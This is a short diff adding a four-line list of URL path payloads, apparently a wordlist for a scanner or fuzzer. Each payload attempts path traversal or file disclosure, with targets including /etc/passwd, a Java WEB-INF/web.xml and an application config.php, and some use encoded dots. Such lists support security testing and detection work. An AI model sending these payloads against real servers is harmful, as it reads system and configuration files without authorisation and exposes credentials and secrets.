@@ -1,0 +1,4 @@
+/%c0%ae/WEB-INF/web.xml
+/new/client.php?m=download&a=downloadFile&file=..%2F../new/Client/Conf/config.php
+/../../../etc/passwd
+/public/plugins/welcome/../../../../../../../../etc/passwd
